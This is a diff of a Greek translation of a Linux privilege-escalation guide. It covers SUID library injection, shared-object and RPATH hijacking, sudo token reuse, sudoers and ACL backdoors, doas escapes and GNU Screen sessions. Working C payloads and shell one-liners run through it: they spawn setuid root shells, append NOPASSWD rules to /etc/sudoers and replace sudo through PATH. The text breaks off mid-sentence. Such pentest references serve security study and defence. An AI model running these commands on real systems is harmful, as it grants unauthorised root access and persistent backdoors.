+Για παράδειγμα, αν συναντήσετε ένα σφάλμα όπως _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_, αυτό υποδηλώνει πιθανότητα εκμετάλλευσης.
+
+Για να γίνει exploit, θα πρέπει να δημιουργήσετε ένα αρχείο C, για παράδειγμα _"/path/to/.config/libcalc.c"_, το οποίο θα περιέχει τον ακόλουθο κώδικα:
+
 ```c
 #include <stdio.h>
 #include <stdlib.h>
@@ -1398,18 +1609,22 @@ strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
 static void inject() __attribute__((constructor));
 
 void inject(){
-system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
+    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
 }
 ```
-Αυτός ο κώδικας, αφού μεταγλωττιστεί και εκτελεστεί, έχει ως στόχο την ανύψωση δικαιωμάτων μέσω χειρισμού των δικαιωμάτων αρχείων και εκτέλεσης ενός shell με αυξημένα δικαιώματα.
 
-Μεταγλωττίστε το παραπάνω αρχείο C σε ένα shared object (.so) αρχείο με:
+Αυτός ο κώδικας, αφού μεταγλωττιστεί και εκτελεστεί, αποσκοπεί στην κλιμάκωση προνομίων μέσω χειρισμού των δικαιωμάτων αρχείων και εκτέλεσης ενός shell με αυξημένα προνόμια.
+
+Μεταγλωττίστε το παραπάνω αρχείο C σε αρχείο shared object (.so) με:
+
 ```bash
 gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
 ```
-Τέλος, η εκτέλεση του επηρεαζόμενου SUID binary θα πρέπει να ενεργοποιήσει το exploit, επιτρέποντας πιθανή παραβίαση του συστήματος.
+
+Τέλος, η εκτέλεση του επηρεαζόμενου SUID binary θα πρέπει να ενεργοποιήσει το exploit, επιτρέποντας ενδεχομένως την παραβίαση του συστήματος.
 
 ## Shared Object Hijacking
+
 ```bash
 # Lets find a SUID using a non-standard library
 ldd some_suid
@@ -1419,7 +1634,9 @@ something.so => /lib/x86_64-linux-gnu/something.so
 readelf -d payroll  | grep PATH
 0x000000000000001d (RUNPATH)            Library runpath: [/development]
 ```
-Τώρα που βρήκαμε ένα SUID binary που φορτώνει μια library από έναν φάκελο στον οποίο μπορούμε να γράψουμε, ας δημιουργήσουμε τη library σε αυτόν τον φάκελο με το απαραίτητο όνομα:
+
+Τώρα που εντοπίσαμε ένα SUID binary που φορτώνει μια βιβλιοθήκη από έναν φάκελο στον οποίο έχουμε δικαίωμα εγγραφής, ας δημιουργήσουμε τη βιβλιοθήκη σε αυτόν τον φάκελο με το απαραίτητο όνομα:
+
 ```c
 //gcc src.c -fPIC -shared -o /development/libshared.so
 #include <stdio.h>
@@ -1428,21 +1645,24 @@ readelf -d payroll  | grep PATH
 static void hijack() __attribute__((constructor));
 
 void hijack() {
-setresuid(0,0,0);
-system("/bin/bash -p");
+        setresuid(0,0,0);
+        system("/bin/bash -p");
 }
 ```
+
 Αν λάβετε ένα σφάλμα όπως
+
 ```shell-session
 ./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
 ```
-αυτό σημαίνει ότι η βιβλιοθήκη που δημιουργήσατε πρέπει να διαθέτει μια συνάρτηση που ονομάζεται `a_function_name`.
+
+αυτό σημαίνει ότι η βιβλιοθήκη που δημιουργήσατε πρέπει να έχει μια συνάρτηση που ονομάζεται `a_function_name`.
 
 ### GTFOBins
 
-Το [**GTFOBins**](https://gtfobins.github.io) είναι μια επιμελημένη λίστα Unix binaries που μπορούν να αξιοποιηθούν από έναν attacker για την παράκαμψη τοπικών περιορισμών ασφαλείας. Το [**GTFOArgs**](https://gtfoargs.github.io/) είναι αντίστοιχο, αλλά για περιπτώσεις όπου μπορείτε να **εισάγετε μόνο ορίσματα** σε μια εντολή.
+Το [**GTFOBins**](https://gtfobins.github.io) είναι μια επιμελημένη λίστα με Unix binaries που μπορεί να εκμεταλλευτεί ένας attacker για να παρακάμψει τοπικούς περιορισμούς ασφαλείας. Το [**GTFOArgs**](https://gtfoargs.github.io/) είναι το ίδιο, αλλά για περιπτώσεις όπου μπορείτε να **εισάγετε μόνο arguments** σε μια εντολή.
 
-Το project συγκεντρώνει legitimate functions Unix binaries που μπορούν να χρησιμοποιηθούν καταχρηστικά για την έξοδο από restricted shells, την κλιμάκωση ή διατήρηση elevated privileges, τη μεταφορά αρχείων, τη δημιουργία bind και reverse shells, καθώς και για τη διευκόλυνση άλλων post-exploitation εργασιών.
+Το project συγκεντρώνει νόμιμες λειτουργίες των Unix binaries που μπορούν να χρησιμοποιηθούν καταχρηστικά για διαφυγή από restricted shells, κλιμάκωση ή διατήρηση αυξημένων privileges, μεταφορά αρχείων, δημιουργία bind και reverse shells και διευκόλυνση άλλων εργασιών post-exploitation.
 
 > gdb -nx -ex '!sh' -ex quit\
 > sudo mysql -e '! /bin/sh'\
@@ -1461,86 +1681,107 @@ https://gtfoargs.github.io/
 
 ### FallOfSudo
 
-Αν έχετε πρόσβαση στο `sudo -l`, μπορείτε να χρησιμοποιήσετε το tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) για να ελέγξετε αν εντοπίζει τρόπο εκμετάλλευσης κάποιου sudo rule.
+Αν έχετε πρόσβαση στο `sudo -l`, μπορείτε να χρησιμοποιήσετε το εργαλείο [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) για να ελέγξετε αν βρίσκει τρόπο να εκμεταλλευτεί κάποιον κανόνα sudo.
 
 ### Επαναχρησιμοποίηση Sudo Tokens
 
-Σε περιπτώσεις όπου έχετε **sudo access**, αλλά όχι τον κωδικό πρόσβασης, μπορείτε να κλιμακώσετε τα privileges **περιμένοντας την εκτέλεση μιας sudo εντολής και στη συνέχεια κάνοντας hijack του session token**.<sup>[[18]](#references)</sup>
+Σε περιπτώσεις όπου έχετε **sudo access** αλλά όχι τον κωδικό πρόσβασης, μπορείτε να κλιμακώσετε τα privileges **περιμένοντας την εκτέλεση μιας εντολής sudo και έπειτα κάνοντας hijack το session token**.<sup>[[18]](#references)</sup>
 
-Απαιτήσεις για την κλιμάκωση privileges:
+Απαιτήσεις για την κλιμάκωση των privileges:
 
-- Έχετε ήδη shell ως ο χρήστης "_sampleuser_"
-- Ο "_sampleuser_" έχει **χρησιμοποιήσει το `sudo`** για να εκτελέσει κάτι **τα τελευταία 15 λεπτά** (από προεπιλογή, αυτή είναι η διάρκεια του sudo token που μας επιτρέπει να χρησιμοποιούμε το `sudo` χωρίς να εισάγουμε κωδικό πρόσβασης)
-- Το `cat /proc/sys/kernel/yama/ptrace_scope` είναι 0
-- Το `gdb` είναι προσβάσιμο (θα πρέπει να μπορείτε να το κάνετε upload)
+- Έχετε ήδη shell ως χρήστης "_sampleuser_"
+- Ο "_sampleuser_" έχει **χρησιμοποιήσει το `sudo`** για να εκτελέσει κάτι τα **τελευταία 15 λεπτά** (από προεπιλογή, αυτή είναι η διάρκεια του sudo token που μας επιτρέπει να χρησιμοποιούμε το `sudo` χωρίς να εισάγουμε κωδικό πρόσβασης)
+- Το `cat /proc/sys/kernel/yama/ptrace_scope` επιστρέφει 0
+- Το `gdb` είναι διαθέσιμο (μπορείτε να το ανεβάσετε)
 
-(Μπορείτε να ενεργοποιήσετε προσωρινά το `ptrace_scope` με `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ή να το τροποποιήσετε μόνιμα στο `/etc/sysctl.d/10-ptrace.conf`, ορίζοντας `kernel.yama.ptrace_scope = 0`)
+(Μπορείτε να ενεργοποιήσετε προσωρινά το `ptrace_scope` με `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ή μόνιμα τροποποιώντας το `/etc/sysctl.d/10-ptrace.conf` και ορίζοντας το `kernel.yama.ptrace_scope = 0`)
 
 Αν πληρούνται όλες αυτές οι απαιτήσεις, **μπορείτε να κλιμακώσετε τα privileges χρησιμοποιώντας:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)
 
-- Το **πρώτο exploit** (`exploit.sh`) θα δημιουργήσει το binary `activate_sudo_token` στο _/tmp_. Μπορείτε να το χρησιμοποιήσετε για να **ενεργοποιήσετε το sudo token στο session σας** (δεν θα λάβετε αυτόματα root shell, εκτελέστε `sudo su`):
+- Το **πρώτο exploit** (`exploit.sh`) θα δημιουργήσει το binary `activate_sudo_token` στο _/tmp_. Μπορείτε να το χρησιμοποιήσετε για να **ενεργοποιήσετε το sudo token στη συνεδρία σας** (δεν θα λάβετε αυτόματα root shell· εκτελέστε `sudo su`):
+
 ```bash
 bash exploit.sh
 /tmp/activate_sudo_token
 sudo su
 ```
-- Το **δεύτερο exploit** (`exploit_v2.sh`) θα δημιουργήσει ένα sh shell στο _/tmp_ **που ανήκει στον root και έχει setuid**
+
+- Το **δεύτερο exploit** (`exploit_v2.sh`) θα δημιουργήσει ένα sh shell στο _/tmp_, **με ιδιοκτήτη τον root και ενεργοποιημένο το setuid**.
+
 ```bash
 bash exploit_v2.sh
 /tmp/sh -p
 ```
-- Το **third exploit** (`exploit_v3.sh`) θα **δημιουργήσει ένα αρχείο sudoers** που κάνει τα **sudo tokens αιώνια και επιτρέπει σε όλους τους χρήστες να χρησιμοποιούν το sudo**
+
+- Το **third exploit** (`exploit_v3.sh`) θα **δημιουργήσει ένα αρχείο sudoers** που κάνει τα **sudo tokens αιώνια και επιτρέπει σε όλους τους χρήστες να χρησιμοποιούν sudo**
+
 ```bash
 bash exploit_v3.sh
 sudo su
 ```
+
 ### /var/run/sudo/ts/\<Username>
 
-Εάν έχεις **δικαιώματα εγγραφής** στον φάκελο ή σε οποιοδήποτε από τα δημιουργημένα αρχεία μέσα σε αυτόν, μπορείς να χρησιμοποιήσεις το binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) για να **δημιουργήσεις ένα sudo token για έναν χρήστη και ένα PID**.\
-Για παράδειγμα, αν μπορείς να αντικαταστήσεις το αρχείο _/var/run/sudo/ts/sampleuser_ και έχεις ένα shell ως αυτός ο χρήστης με PID 1234, μπορείς να **αποκτήσεις sudo privileges** χωρίς να χρειάζεται να γνωρίζεις τον κωδικό πρόσβασης, εκτελώντας:
+Αν έχετε **δικαιώματα εγγραφής** στον φάκελο ή σε οποιοδήποτε από τα αρχεία που έχουν δημιουργηθεί μέσα στον φάκελο, μπορείτε να χρησιμοποιήσετε το binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) για να **δημιουργήσετε ένα sudo token για έναν χρήστη και PID**.\
+Για παράδειγμα, αν μπορείτε να αντικαταστήσετε το αρχείο _/var/run/sudo/ts/sampleuser_ και έχετε ένα shell ως αυτός ο χρήστης με PID 1234, μπορείτε να **αποκτήσετε sudo privileges** χωρίς να χρειάζεται να γνωρίζετε τον κωδικό πρόσβασης, κάνοντας τα εξής:
+
 ```bash
 ./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
 ```
+
 ### /etc/sudoers, /etc/sudoers.d
 
-Το αρχείο `/etc/sudoers` και τα αρχεία μέσα στο `/etc/sudoers.d` διαμορφώνουν ποιος μπορεί να χρησιμοποιεί το `sudo` και με ποιον τρόπο. Αυτά τα αρχεία **από προεπιλογή μπορούν να διαβαστούν μόνο από τον χρήστη root και την ομάδα root**.\
-**Αν** μπορείτε να **διαβάσετε** αυτό το αρχείο, ενδέχεται να μπορέσετε να **αποκτήσετε ορισμένες ενδιαφέρουσες πληροφορίες**, και αν μπορείτε να **γράψετε** σε οποιοδήποτε αρχείο, θα μπορείτε να **κάνετε privilege escalation**.
+Το αρχείο `/etc/sudoers` και τα αρχεία μέσα στο `/etc/sudoers.d` ρυθμίζουν ποιος μπορεί να χρησιμοποιεί το `sudo` και με ποιον τρόπο. Αυτά τα αρχεία **από προεπιλογή μπορούν να διαβαστούν μόνο από τον χρήστη root και την ομάδα root**.\
+**Αν** μπορείτε να **διαβάσετε** αυτό το αρχείο, ίσως μπορέσετε να **αποκτήσετε ενδιαφέρουσες πληροφορίες**, ενώ αν μπορείτε να **γράψετε** σε οποιοδήποτε αρχείο, θα μπορέσετε να **κλιμακώσετε τα δικαιώματά σας**.
+
 ```bash
 ls -l /etc/sudoers /etc/sudoers.d/
 ls -ld /etc/sudoers.d/
 ```
-Αν έχεις δικαίωμα εγγραφής, μπορείς να εκμεταλλευτείς αυτή την άδεια
+
+Αν έχεις δικαίωμα εγγραφής, μπορείς να το καταχραστείς.
+
 ```bash
 echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
 echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
 ```
-Ένας ακόμη τρόπος κατάχρησης αυτών των δικαιωμάτων:
+
+Ένας άλλος τρόπος να καταχραστείτε αυτά τα δικαιώματα:
+
 ```bash
 # makes it so every terminal can sudo
 echo "Defaults !tty_tickets" > /etc/sudoers.d/win
 # makes it so sudo never times out
 echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
 ```
+
 ### DOAS
 
-Υπάρχουν ορισμένες εναλλακτικές του binary `sudo`, όπως το `doas` για το OpenBSD. Θυμηθείτε να ελέγξετε τη διαμόρφωσή του στο `/etc/doas.conf`
+Υπάρχουν ορισμένες εναλλακτικές στο δυαδικό αρχείο `sudo`, όπως το `doas` για το OpenBSD. Θυμηθείτε να ελέγξετε τη διαμόρφωσή του στο `/etc/doas.conf`
+
 ```bash
 permit nopass demo as root cmd vim
 permit nopass demo as root cmd python3
 permit nopass keepenv demo as root cmd /opt/backup.sh
 ```
-Αν το `doas` επιτρέπει έναν editor ή interpreter, ελέγξτε escapes τύπου GTFOBins:
+
+Αν το `doas` επιτρέπει τη χρήση editor ή interpreter, ελέγξτε για διαφυγές τύπου GTFOBins:
+
 ```bash
 doas vim
 :!/bin/sh
 ```
+
+Ένας κανόνας `doas` με δυνατότητα εκτέλεσης ως root για το αρχικό `dstat` που βασίζεται στην Python αξίζει επίσης έλεγχο της διαδρομής των plugin. Το [εγχειρίδιό](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) του και ο [πηγαίος κώδικας](https://github.com/dstat-real/dstat/blob/master/dstat) αναφέρουν τα `/usr/share/dstat/` και `/usr/local/share/dstat/` μεταξύ των τοποθεσιών για plugin `dstat_*.py`. Αν ο τρέχων χρήστης μπορεί να γράψει σε μια τοποθεσία που χρησιμοποιεί πράγματι η εγκατεστημένη έκδοση και να αναζητήσει σε αυτήν, μπορεί να εκτελεστεί ένα επιλεγμένο plugin με την ταυτότητα RunAs του `doas`. Επιβεβαιώστε τον ενεργό κανόνα, την αναζήτηση plugin σε αυτή την έκδοση, τα δικαιώματα ή τις ACL του καταλόγου και των γονικών καταλόγων, καθώς και αν ο καλών μπορεί να επιλέξει plugin· ένας κανόνας `dstat` ή ένας εγγράψιμος κατάλογος από μόνος του αποτελεί απλώς ένδειξη. Άλλες υλοποιήσεις του `dstat` μπορεί να χρησιμοποιούν διαφορετικά συστήματα plugin. Επιθεωρήστε τα metadata παθητικά, χωρίς να φορτώσετε plugin.
+
 ### Sudo Hijacking
 
-Αν γνωρίζεις ότι ένας **user συνδέεται συνήθως σε ένα machine και χρησιμοποιεί `sudo`** για privilege escalation και έχεις αποκτήσει ένα shell μέσα στο context αυτού του user, μπορείς να **δημιουργήσεις ένα νέο sudo executable** που θα εκτελεί τον κώδικά σου ως root και στη συνέχεια την εντολή του user. Έπειτα, **τροποποίησε το $PATH** του context του user (για παράδειγμα, προσθέτοντας το νέο path στο .bash_profile), ώστε όταν ο user εκτελεί το sudo, να εκτελείται το δικό σου sudo executable.
+Αν γνωρίζετε ότι ένας **χρήστης συνδέεται συνήθως σε ένα μηχάνημα και χρησιμοποιεί το `sudo`** για να κλιμακώσει τα προνόμιά του και έχετε αποκτήσει shell στο πλαίσιο αυτού του χρήστη, μπορείτε να **δημιουργήσετε ένα νέο εκτελέσιμο `sudo`** που θα εκτελεί τον κώδικά σας ως root και έπειτα την εντολή του χρήστη. Στη συνέχεια, **τροποποιήστε το $PATH** του πλαισίου του χρήστη (για παράδειγμα, προσθέτοντας τη νέα διαδρομή στο .bash_profile), ώστε όταν ο χρήστης εκτελεί το sudo, να εκτελείται το δικό σας εκτελέσιμο `sudo`.
 
-Σημείωσε ότι αν ο user χρησιμοποιεί διαφορετικό shell (όχι bash), θα χρειαστεί να τροποποιήσεις άλλα αρχεία για να προσθέσεις το νέο path. Για παράδειγμα, το [sudo-piggyback](https://github.com/APTy/sudo-piggyback) τροποποιεί τα `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Μπορείς να βρεις ένα ακόμη παράδειγμα στο [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)
+Σημειώστε ότι αν ο χρήστης χρησιμοποιεί διαφορετικό shell (όχι bash), θα χρειαστεί να τροποποιήσετε άλλα αρχεία για να προσθέσετε τη νέα διαδρομή. Για παράδειγμα, το [sudo-piggyback](https://github.com/APTy/sudo-piggyback) τροποποιεί τα `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Μπορείτε να βρείτε άλλο ένα παράδειγμα στο [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)
 
 Ή εκτελώντας κάτι όπως:
+
 ```bash
 cat >/tmp/sudo <<EOF
 #!/bin/bash
@@ -1555,16 +1796,17 @@ zsh
 echo $PATH
 sudo ls
 ```
+
 ## Κοινόχρηστη βιβλιοθήκη
 
 ### ld.so
 
-Το αρχείο `/etc/ld.so.conf` υποδεικνύει **από πού προέρχονται τα αρχεία διαμόρφωσης που φορτώνονται**. Συνήθως, αυτό το αρχείο περιέχει το ακόλουθο path: `include /etc/ld.so.conf.d/*.conf`
+Το αρχείο `/etc/ld.so.conf` υποδεικνύει **από πού προέρχονται τα αρχεία ρυθμίσεων που φορτώνονται**. Συνήθως, αυτό το αρχείο περιέχει την ακόλουθη διαδρομή: `include /etc/ld.so.conf.d/*.conf`
 
-Αυτό σημαίνει ότι θα διαβαστούν τα αρχεία διαμόρφωσης από το `/etc/ld.so.conf.d/*.conf`. Αυτά τα αρχεία διαμόρφωσης **υποδεικνύουν άλλους φακέλους** στους οποίους θα **αναζητηθούν** **libraries**. Για παράδειγμα, το περιεχόμενο του `/etc/ld.so.conf.d/libc.conf` είναι `/usr/local/lib`. **Αυτό σημαίνει ότι το σύστημα θα αναζητήσει libraries μέσα στο `/usr/local/lib`**.
+Αυτό σημαίνει ότι θα διαβαστούν τα αρχεία ρυθμίσεων από το `/etc/ld.so.conf.d/*.conf`. Αυτά τα αρχεία ρυθμίσεων **υποδεικνύουν άλλους φακέλους** στους οποίους θα γίνει **αναζήτηση** για **βιβλιοθήκες**. Για παράδειγμα, το περιεχόμενο του `/etc/ld.so.conf.d/libc.conf` είναι `/usr/local/lib`. **Αυτό σημαίνει ότι το σύστημα θα αναζητήσει βιβλιοθήκες μέσα στο `/usr/local/lib`**.
 
-Αν για οποιονδήποτε λόγο **ένας χρήστης έχει δικαιώματα εγγραφής** σε οποιοδήποτε από τα υποδεικνυόμενα paths: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, οποιοδήποτε αρχείο μέσα στο `/etc/ld.so.conf.d/` ή οποιονδήποτε φάκελο που καθορίζεται στο αρχείο διαμόρφωσης μέσα στο `/etc/ld.so.conf.d/*.conf`, ενδέχεται να μπορέσει να κάνει privilege escalation.\
-Δείτε **πώς μπορείτε να εκμεταλλευτείτε αυτήν την εσφαλμένη διαμόρφωση** στην ακόλουθη σελίδα:
+Αν για κάποιο λόγο **ένας χρήστης έχει δικαιώματα εγγραφής** σε οποιαδήποτε από τις διαδρομές που υποδεικνύονται — `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, οποιοδήποτε αρχείο μέσα στο `/etc/ld.so.conf.d/` ή οποιονδήποτε φάκελο μέσα στο αρχείο ρυθμίσεων του `/etc/ld.so.conf.d/*.conf` — ενδέχεται να μπορέσει να κάνει κλιμάκωση προνομίων.\
+Δείτε **πώς να κάνετε exploit σε αυτή την εσφαλμένη ρύθμιση** στην ακόλουθη σελίδα:
 
 
 {{#ref}}
@@ -1572,91 +1814,105 @@ sudo ls
 {{#endref}}
 
 ### RPATH
+
 ```
 level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
-0x00000001 (NEEDED)                     Shared library: [libc.so.6]
-0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
+ 0x00000001 (NEEDED)                     Shared library: [libc.so.6]
+ 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]
 
 level15@nebula:/home/flag15$ ldd ./flag15
-linux-gate.so.1 =>  (0x0068c000)
-libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
-/lib/ld-linux.so.2 (0x005bb000)
+ linux-gate.so.1 =>  (0x0068c000)
+ libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
+ /lib/ld-linux.so.2 (0x005bb000)
 ```
-Με αντιγραφή του lib στο `/var/tmp/flag15/`, θα χρησιμοποιηθεί από το πρόγραμμα σε αυτήν τη θέση, όπως καθορίζεται στη μεταβλητή `RPATH`.
+
+Αντιγράφοντας τη lib στο `/var/tmp/flag15/`, θα χρησιμοποιηθεί από το πρόγραμμα σε αυτήν τη θέση, όπως ορίζεται στη μεταβλητή `RPATH`.
+
 ```
 level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/
 
 level15@nebula:/home/flag15$ ldd ./flag15
-linux-gate.so.1 =>  (0x005b0000)
-libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
-/lib/ld-linux.so.2 (0x00737000)
+ linux-gate.so.1 =>  (0x005b0000)
+ libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
+ /lib/ld-linux.so.2 (0x00737000)
 ```
+
 Στη συνέχεια, δημιουργήστε μια κακόβουλη βιβλιοθήκη στο `/var/tmp` με την εντολή `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
+
 ```c
 #include<stdlib.h>
 #define SHELL "/bin/sh"
 
 int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
 {
-char *file = SHELL;
-char *argv[] = {SHELL,0};
-setresuid(geteuid(),geteuid(), geteuid());
-execve(file,argv,0);
+ char *file = SHELL;
+ char *argv[] = {SHELL,0};
+ setresuid(geteuid(),geteuid(), geteuid());
+ execve(file,argv,0);
 }
 ```
+
 ## Capabilities
 
-Οι capabilities του Linux παρέχουν **ένα υποσύνολο των διαθέσιμων root privileges σε μια διεργασία**. Αυτό ουσιαστικά διαχωρίζει τα root **privileges σε μικρότερες και διακριτές μονάδες**. Κάθε μία από αυτές τις μονάδες μπορεί στη συνέχεια να παραχωρείται ανεξάρτητα σε διεργασίες. Με αυτόν τον τρόπο μειώνεται το πλήρες σύνολο των privileges, περιορίζοντας τους κινδύνους εκμετάλλευσης.\
-Διαβάστε την παρακάτω σελίδα για να **μάθετε περισσότερα σχετικά με τις capabilities και τον τρόπο κατάχρησής τους**:
+Τα Linux capabilities παρέχουν σε μια **διεργασία ένα υποσύνολο των διαθέσιμων προνομίων root**. Αυτό ουσιαστικά διασπά τα **προνόμια root σε μικρότερες, διακριτές μονάδες**. Κάθε μία από αυτές τις μονάδες μπορεί στη συνέχεια να εκχωρείται ανεξάρτητα σε διεργασίες. Με αυτόν τον τρόπο, μειώνεται το πλήρες σύνολο των προνομίων, περιορίζοντας τους κινδύνους εκμετάλλευσης.\
+Διαβάστε την παρακάτω σελίδα για να **μάθετε περισσότερα σχετικά με τα capabilities και πώς να τα καταχραστείτε**:
 
 
 {{#ref}}
 ../../interesting-files-permissions/linux-capabilities.md
 {{#endref}}
 
-## Directory permissions
+## Δικαιώματα καταλόγων
 
-Σε έναν directory, το **bit για "execute"** υποδηλώνει ότι ο επηρεαζόμενος χρήστης μπορεί να κάνει "**cd**" στον φάκελο.\
-Το **bit "read"** υποδηλώνει ότι ο χρήστης μπορεί να κάνει **list** τα **files**, ενώ το **bit "write"** υποδηλώνει ότι ο χρήστης μπορεί να **διαγράφει** και να **δημιουργεί** νέα **files**.
+Σε έναν κατάλογο, το **bit για «εκτέλεση»** σημαίνει ότι ο επηρεαζόμενος χρήστης μπορεί να κάνει «**cd**» στον φάκελο.\
+Το bit **«ανάγνωσης»** σημαίνει ότι ο χρήστης μπορεί να **εμφανίσει τη λίστα** των **αρχείων**, ενώ το bit **«εγγραφής»** σημαίνει ότι μπορεί να **διαγράψει** και να **δημιουργήσει** νέα **αρχεία**.
 
 ## ACLs
 
-Οι Access Control Lists (ACLs) αντιπροσωπεύουν το δευτερεύον επίπεδο discretionary permissions, με δυνατότητα **παράκαμψης των παραδοσιακών ugo/rwx permissions**. Αυτά τα permissions ενισχύουν τον έλεγχο της πρόσβασης σε file ή directory, επιτρέποντας ή απορρίπτοντας δικαιώματα σε συγκεκριμένους χρήστες που δεν είναι owners ή μέλη του group. Αυτό το επίπεδο **granularity εξασφαλίζει ακριβέστερη διαχείριση πρόσβασης**. Περισσότερες λεπτομέρειες μπορείτε να βρείτε [**εδώ**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>
+Οι Access Control Lists (ACLs) αποτελούν το δευτερεύον επίπεδο διακριτικών δικαιωμάτων, με δυνατότητα **παράκαμψης των παραδοσιακών δικαιωμάτων ugo/rwx**. Αυτά τα δικαιώματα ενισχύουν τον έλεγχο της πρόσβασης σε αρχεία ή καταλόγους, επιτρέποντας ή αρνούμενα δικαιώματα σε συγκεκριμένους χρήστες που δεν είναι οι ιδιοκτήτες ή μέλη της ομάδας. Αυτό το επίπεδο **λεπτομερούς ελέγχου εξασφαλίζει ακριβέστερη διαχείριση πρόσβασης**. Περισσότερες λεπτομέρειες θα βρείτε [**εδώ**](https://linuxconfig.org/how-to-manage-acls-on-linux).<sup>[[19]](#references)</sup>
 
-**Δώστε** στον χρήστη "kali" permissions ανάγνωσης και εγγραφής σε ένα file:
+**Δώστε** στον χρήστη "kali" δικαιώματα ανάγνωσης και εγγραφής σε ένα αρχείο:
+
 ```bash
 setfacl -m u:kali:rw file.txt
 #Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)
 
 setfacl -b file.txt #Remove the ACL of the file
 ```
+
 **Λήψη** αρχείων με συγκεκριμένα ACL από το σύστημα:
+
 ```bash
 getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
 ```
-### Κρυφό ACL backdoor σε drop-ins του sudoers
 
-Μια συνηθισμένη λανθασμένη ρύθμιση είναι ένα αρχείο στο `/etc/sudoers.d/` που ανήκει στον root και έχει mode `440`, αλλά εξακολουθεί να παρέχει δικαίωμα εγγραφής σε έναν χρήστη χαμηλών προνομίων μέσω ACL.
+### Κρυφό backdoor μέσω ACL σε drop-in αρχεία sudoers
+
+Μια συνηθισμένη λανθασμένη ρύθμιση είναι ένα αρχείο στο `/etc/sudoers.d/`, ιδιοκτησίας του root και με mode `440`, το οποίο εξακολουθεί να παρέχει δικαίωμα εγγραφής σε χρήστη χαμηλών προνομίων μέσω ACL.
+
 ```bash
 ls -l /etc/sudoers.d/*
 getfacl /etc/sudoers.d/<file>
 ```
-Αν δείτε κάτι όπως `user:alice:rw-`, ο χρήστης μπορεί να προσθέσει έναν κανόνα sudo παρά τα περιοριστικά mode bits:
+
+Αν δείτε κάτι όπως `user:alice:rw-`, ο χρήστης μπορεί να προσθέσει έναν κανόνα sudo παρά τα περιοριστικά bits δικαιωμάτων:
+
 ```bash
 echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
 visudo -cf /etc/sudoers.d/<file>
 sudo -l
 ```
-Αυτή είναι μια διαδρομή ACL persistence/privesc υψηλού αντίκτυπου, επειδή είναι εύκολο να παραβλεφθεί σε ελέγχους που βασίζονται μόνο στο `ls -l`.
 
-## Ανοιχτές shell sessions
+Αυτή είναι μια διαδρομή persistence/privesc μέσω ACL υψηλού αντίκτυπου, επειδή είναι εύκολο να παραβλεφθεί σε ελέγχους που βασίζονται μόνο στο `ls -l`.
 
-Σε **παλιές εκδόσεις** μπορεί να **hijack** κάποια **shell** session διαφορετικού χρήστη (**root**).\
-Σε **νεότερες εκδόσεις** θα μπορείτε να **connect** σε screen sessions μόνο του **δικού σας χρήστη**. Ωστόσο, μπορεί να βρείτε **ενδιαφέρουσες πληροφορίες μέσα στη session**.
+## Ανοιχτές συνεδρίες shell
+
+Η πρόσβαση μεταξύ χρηστών στο GNU Screen εξαρτάται από τη **διαμόρφωση και το ACL της ενεργής συνεδρίας**, όχι μόνο από την έκδοσή του. [Η τεκμηρίωση του GNU Screen αναφέρει](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) ότι πρέπει να έχει μεταγλωττιστεί με υποστήριξη multiuser· οι ρυθμίσεις `multiuser on` και `acladd` ή μια κατάλληλη παραχώρηση μέσω `aclchg` επιτρέπουν σε άλλον χρήστη να συνδεθεί. [Το εγχειρίδιο απαιτεί επίσης setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) για την αναζήτηση συνεδρίας μεταξύ χρηστών. Ένα ορατό socket που ανήκει στον root ή ένα SUID δυαδικό αρχείο `screen` από μόνο του δεν αποδεικνύει ότι υπάρχει shell root στο οποίο μπορεί να συνδεθεί κάποιος. Πριν το θεωρήσετε κλιμάκωση προνομίων, επιβεβαιώστε ότι η ενεργή συνεδρία είναι multiuser, ότι ο τρέχων χρήστης έχει αποτελεσματικά δικαιώματα 